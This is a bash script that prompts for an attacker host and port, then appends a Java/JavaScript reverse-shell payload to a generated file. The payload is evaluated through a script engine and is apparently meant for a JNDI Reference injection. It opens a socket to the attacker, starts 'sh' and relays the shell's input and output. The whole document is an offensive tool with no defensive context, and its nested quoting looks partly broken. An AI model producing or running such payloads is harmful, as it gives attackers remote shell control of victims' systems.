#!/bin/bash


read -p '[+] Enter LHOST : ' LHOST
read -p '[+] Enter LPORT : ' LPORT
echo "LHOST : $LHOST"
echo "LPORT : $LPORT"
echo """
String command = 'var host = '$LHOST';' +
                       'var port = $LPORT;' +
                       'var cmd = 'sh';'+
                       'var s = new java.net.Socket(host, port);' +
                       'var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();'+
                       'var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();'+
                       'var po = p.getOutputStream(), so = s.getOutputStream();'+
                       'print ('connected');'+
                       'while (!s.isClosed()) {'+
                       '    while (pi.available() > 0)'+
                       '        so.write(pi.read());'+
                       '    while (pe.available() > 0)'+
                       '        so.write(pe.read());'+
                       '    while (si.available() > 0)'+
                       '        po.write(si.read());'+
                       '    so.flush();'+
                       '    po.flush();'+
                       '    java.lang.Thread.sleep(50);'+
                       '    try {'+
                       '        p.exitValue();'+
                       '        break;'+
                       '    }'+
                       '    catch (e) {'+
                       '    }'+
                       '}'+
                       'p.destroy();'+
                       's.close();';
String x = '\'\'.getClass().forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'+command+'\')';
ref.add(new StringRefAddr('x', x);
""" >> ../wd-generated/javascriptshell.js